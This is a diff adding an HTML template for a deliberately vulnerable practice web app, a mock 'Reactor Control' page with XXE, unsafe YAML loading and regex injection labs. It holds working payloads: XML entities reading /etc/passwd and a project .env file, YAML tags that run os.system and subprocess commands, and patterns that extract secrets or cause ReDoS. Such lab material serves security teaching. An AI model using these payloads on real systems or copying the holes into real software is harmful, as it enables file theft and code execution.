@@ -1,0 +1,193 @@
+{% extends 'base.html' %}
+{% block title %}Reactor Control{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v22.css') }}">
+{% endblock %}
+{% block content %}
+<div class="pagehead" style="display:flex;align-items:center;gap:14px;margin-bottom:22px;">
+  <img src="{{ url_for('static', filename='img/svg/icon-reactor.svg') }}" width="44" height="44" alt="">
+  <div>
+    <h1 style="margin:0 0 2px;">Reactor Control Interface</h1>
+    <p style="margin:0;color:var(--dim);font-size:13px;">Core management — XML/YAML config import and pattern monitoring. Three P1/P2 findings active.</p>
+  </div>
+</div>
+
+<div class="grid grid-2" style="gap:18px;align-items:start;margin-bottom:20px;">
+  <!-- Live reactor visualizer -->
+  <div class="reactor-panel">
+    <div class="reactor-core">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.15em;color:rgba(255,92,92,.5);margin-bottom:6px;">AEGIS · REACTOR · CORE · Ω-7</div>
+      <div style="position:relative;width:160px;height:160px;display:flex;align-items:center;justify-content:center;">
+        <div class="reactor-ring r1" style="position:absolute;"></div>
+        <div class="reactor-ring r2" style="position:absolute;"></div>
+        <div class="reactor-ring r3" style="position:absolute;"></div>
+        <div style="text-align:center;z-index:1;">
+          <div class="reactor-temp">9182°</div>
+          <div class="reactor-label">CELSIUS</div>
+        </div>
+      </div>
+      <div class="rod-wrap">
+        {% for h in [65,55,70,45,75,60,50] %}
+        <div class="rod" style="height:{{ h }}px;"></div>
+        {% endfor %}
+      </div>
+      <div class="reactor-label" style="margin-top:6px;">CONTROL RODS · AUTO</div>
+    </div>
+    <div class="control-row">
+      <button class="ctrl-btn" onclick="scram()">⚡ SCRAM</button>
+      <button class="ctrl-btn" onclick="vent()">↑ VENT STEAM</button>
+      <button class="ctrl-btn safe">↓ INSERT RODS</button>
+      <button class="ctrl-btn safe">⟳ RESET</button>
+    </div>
+  </div>
+
+  <!-- Vuln summary panel -->
+  <div style="display:flex;flex-direction:column;gap:12px;">
+    <div class="panel" style="background:rgba(255,92,92,0.04);border-color:rgba(255,92,92,.25);">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;"><h2 style="margin:0;font-size:13px;">Active Findings</h2></div>
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <div class="vuln-callout"><span class="sev p1" style="flex:none;">P1</span><p>XXE via reactor XML config upload — external entities read arbitrary files (CWE-611)</p></div>
+        <div class="vuln-callout"><span class="sev p1" style="flex:none;">P1</span><p>Unsafe YAML load with <code>yaml.Loader</code> — <code>!!python/object</code> tags achieve RCE (CWE-502)</p></div>
+        <div class="vuln-callout"><span class="sev p2" style="flex:none;">P2</span><p>Regex injection + ReDoS — user-controlled pattern against secret haystack (CWE-730/89)</p></div>
+      </div>
+    </div>
+    <div class="panel">
+      <h2 style="font-size:13px;margin-bottom:8px;">Core Stats</h2>
+      <table style="width:100%;font-size:12px;border-collapse:collapse;">
+        {% for label,val,cls in [('Core Temp','9182 °C','crit'),('O2 Level','98.4 %','ok'),('Control Rods','7 / 10','warn'),('Coolant Flow','82 L/s','ok'),('Override Key','NX-7734-OMEGA','crit')] %}
+        <tr style="border-bottom:1px solid var(--hairline);">
+          <td style="padding:7px 0;color:var(--dim);">{{ label }}</td>
+          <td style="font-family:'JetBrains Mono',monospace;color:{{ 'var(--danger)' if cls=='crit' else 'var(--cyan)' if cls=='ok' else 'var(--amber)' }};">{{ val }}</td>
+        </tr>
+        {% endfor %}
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- XXE Lab -->
+<div class="panel" style="margin-bottom:16px;">
+  <h2>XML Config Import <span class="sev p1" style="margin-left:8px;">P1 · XXE</span></h2>
+  <div class="grid grid-2" style="gap:16px;">
+    <div>
+      <p style="font-size:12px;color:var(--dim);">Upload a reactor configuration XML. The server parses it with <code>lxml.etree.XMLParser(resolve_entities=True)</code> — external entities are resolved, reading files from the server filesystem.</p>
+      <textarea id="xml-body" rows="8" style="width:100%;background:var(--void);border:1px solid var(--hairline);color:#a8ff78;border-radius:var(--radius);padding:10px;font-family:'JetBrains Mono',monospace;font-size:11px;resize:vertical;">{{ xxe_payload }}</textarea>
+      <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;">
+        <button class="btn small" onclick="sendXml()">Parse Config →</button>
+        <button class="btn small secondary" onclick="loadXxePayload('passwd')">PoC: /etc/passwd</button>
+        <button class="btn small secondary" onclick="loadXxePayload('env')">PoC: .env file</button>
+        <button class="btn small secondary" onclick="loadXxePayload('app')">PoC: app.py</button>
+      </div>
+      <pre class="code" id="xml-out" style="margin-top:10px;display:none;max-height:200px;overflow-y:auto;font-size:11px;"></pre>
+    </div>
+    <div>
+      <p style="font-size:12px;color:var(--dim);margin-bottom:8px;">XXE attack structure:</p>
+      <pre class="code" style="font-size:10px;">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE config [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;reactor-config&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;core-temp&gt;9182&lt;/core-temp&gt;
+&lt;/reactor-config&gt;</pre>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-611 · XML External Entity · lxml resolve_entities=True</div>
+    </div>
+  </div>
+</div>
+
+<!-- YAML RCE Lab -->
+<div class="panel" style="margin-bottom:16px;">
+  <h2>YAML Config Import <span class="sev p1" style="margin-left:8px;">P1 · Unsafe YAML Load</span></h2>
+  <div class="grid grid-2" style="gap:16px;">
+    <div>
+      <p style="font-size:12px;color:var(--dim);">Reactor parameters can be loaded from YAML. The parser uses <code>yaml.Loader</code> (not <code>SafeLoader</code>) enabling arbitrary Python object instantiation.</p>
+      <textarea id="yaml-body" rows="6" style="width:100%;background:var(--void);border:1px solid var(--hairline);color:#a8ff78;border-radius:var(--radius);padding:10px;font-family:'JetBrains Mono',monospace;font-size:11px;resize:vertical;">core_temp: 9182
+coolant_flow: 82
+status: nominal</textarea>
+      <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;">
+        <button class="btn small" onclick="sendYaml()">Parse YAML →</button>
+        <button class="btn small secondary" onclick="loadYamlRce('id')">PoC: id</button>
+        <button class="btn small secondary" onclick="loadYamlRce('whoami')">PoC: whoami</button>
+      </div>
+      <pre class="code" id="yaml-out" style="margin-top:10px;display:none;max-height:160px;overflow-y:auto;font-size:11px;"></pre>
+    </div>
+    <div>
+      <pre class="code" style="font-size:10px;"># Safe (yaml.SafeLoader):
+core_temp: 9182
+
+# Malicious (yaml.Loader allows !!python/object):
+!!python/object/apply:os.system
+- "id > /tmp/pwned.txt"
+
+# Or: instantiate subprocess
+!!python/object/apply:subprocess.check_output
+- ["id"]</pre>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-502 · Deserialization of Untrusted Data</div>
+    </div>
+  </div>
+</div>
+
+<!-- Regex Lab -->
+<div class="panel">
+  <h2>Alert Pattern Monitor <span class="sev p2" style="margin-left:8px;">P2 · Regex Injection + ReDoS</span></h2>
+  <p style="font-size:12px;color:var(--dim);">Match patterns against the station's internal telemetry log. The pattern is passed directly to <code>re.search()</code> — use capture groups to extract secrets, or catastrophic backtracking to DoS.</p>
+  <div style="display:flex;gap:8px;align-items:flex-start;flex-wrap:wrap;">
+    <div style="flex:1;min-width:220px;">
+      <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Regex pattern</label>
+      <input id="re-pattern" type="text" value="secret=(\w+)" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+    </div>
+    <div style="flex:1;min-width:220px;">
+      <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Haystack (default: station log)</label>
+      <input id="re-haystack" type="text" placeholder="leave blank for default" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+    </div>
+    <button class="btn small" style="margin-top:19px;" onclick="sendRegex()">Test →</button>
+  </div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;">
+    <button class="btn small secondary" style="font-family:'JetBrains Mono',monospace;font-size:11px;" onclick="document.getElementById('re-pattern').value='secret=(\\w+)'">Extract secret</button>
+    <button class="btn small secondary" style="font-family:'JetBrains Mono',monospace;font-size:11px;" onclick="document.getElementById('re-pattern').value='token=(\\w+)'">Extract token</button>
+    <button class="btn small secondary" style="font-family:'JetBrains Mono',monospace;font-size:11px;" onclick="document.getElementById('re-pattern').value='(a+)+'">ReDoS payload</button>
+    <button class="btn small secondary" style="font-family:'JetBrains Mono',monospace;font-size:11px;" onclick="document.getElementById('re-pattern').value='KEY:\\s*([A-Z0-9\\-]+)'">Extract key</button>
+  </div>
+  <pre class="code" id="re-out" style="margin-top:10px;display:none;font-size:11px;"></pre>
+  <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-730 ReDoS · CWE-89 Regex Injection (secret extraction via capture groups)</div>
+</div>
+
+<script src="{{ url_for('static', filename='js/aegis-v22.js') }}"></script>
+<script>
+const XXE = {
+  passwd:`<?xml version="1.0"?>\n<!DOCTYPE config [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<reactor-config>\n  <name>&xxe;</name>\n  <core-temp>9182</core-temp>\n</reactor-config>`,
+  env:`<?xml version="1.0"?>\n<!DOCTYPE config [\n  <!ENTITY xxe SYSTEM "file:///home/claude/work/lawcypenlab/.env">\n]>\n<reactor-config>\n  <key>&xxe;</key>\n</reactor-config>`,
+  app:`<?xml version="1.0"?>\n<!DOCTYPE config [\n  <!ENTITY xxe SYSTEM "file:///home/claude/work/lawcypenlab/seed.py">\n]>\n<reactor-config>\n  <src>&xxe;</src>\n</reactor-config>`,
+};
+function loadXxePayload(k){ document.getElementById('xml-body').value = XXE[k]; }
+function loadYamlRce(cmd){
+  document.getElementById('yaml-body').value = `!!python/object/apply:subprocess.check_output\n- ["${cmd}"]`;
+}
+async function sendXml(){
+  const body = document.getElementById('xml-body').value;
+  const out  = document.getElementById('xml-out');
+  out.style.display='block'; out.textContent='Parsing…';
+  const r = await fetch('/reactor-control/import-xml',{method:'POST',headers:{'Content-Type':'application/xml'},body});
+  out.textContent=`HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+}
+async function sendYaml(){
+  const config = document.getElementById('yaml-body').value;
+  const out    = document.getElementById('yaml-out');
+  out.style.display='block'; out.textContent='Parsing…';
+  const r = await fetch('/reactor-control/import-yaml',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'config='+encodeURIComponent(config)});
+  out.textContent=`HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+}
+async function sendRegex(){
+  const p = document.getElementById('re-pattern').value;
+  const h = document.getElementById('re-haystack').value;
+  const out= document.getElementById('re-out');
+  out.style.display='block'; out.textContent='Running…';
+  const qs = new URLSearchParams({pattern:p});
+  if(h) qs.set('haystack',h);
+  const r = await fetch('/reactor-control/pattern-check',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'pattern='+encodeURIComponent(p)+(h?'&haystack='+encodeURIComponent(h):'')});
+  out.textContent=`HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+}
+function scram(){ document.querySelector('.reactor-temp').style.color='var(--cyan)'; document.querySelector('.reactor-temp').textContent='SAFE'; }
+function vent(){  document.querySelector('.reactor-temp').style.color='var(--amber)'; document.querySelector('.reactor-temp').textContent='7441°'; }
+</script>
+{% endblock %}
